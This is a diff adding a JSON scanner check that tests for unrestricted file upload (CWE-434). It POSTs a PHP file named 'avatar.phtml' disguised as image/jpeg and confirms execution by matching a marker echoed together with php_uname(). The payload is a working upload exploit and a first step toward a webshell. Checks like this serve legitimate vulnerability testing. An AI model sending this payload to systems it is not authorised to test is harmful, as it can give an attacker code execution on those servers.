@@ -1,0 +1,36 @@
+{
+  "name": "web/Upload phtml execution marker",
+  "description": "[critical] Proves .phtml upload reaching EXECUTION: server runs PHP inside the uploaded file and echoes marker+php_uname = webshell-class foothold (T1505.003), not merely stored bytes. Keywords: upload phtml php execution webshell polyglot t1505. ctrl: upload saved but served static (marker absent) -> not falsified. base_url = upload endpoint.",
+  "cwe": "CWE-434",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/upload",
+      "headers": {
+        "Content-Type": "multipart/form-data; boundary=b9f4c"
+      },
+      "body": "--b9f4c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"avatar.phtml\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo \"e9runt\".php_uname().\"e9runt\"; ?>\r\n--b9f4c--\r\n"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "e9runt[^\\r\\n]{3,}e9runt",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "9f7fdacbc5ea",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
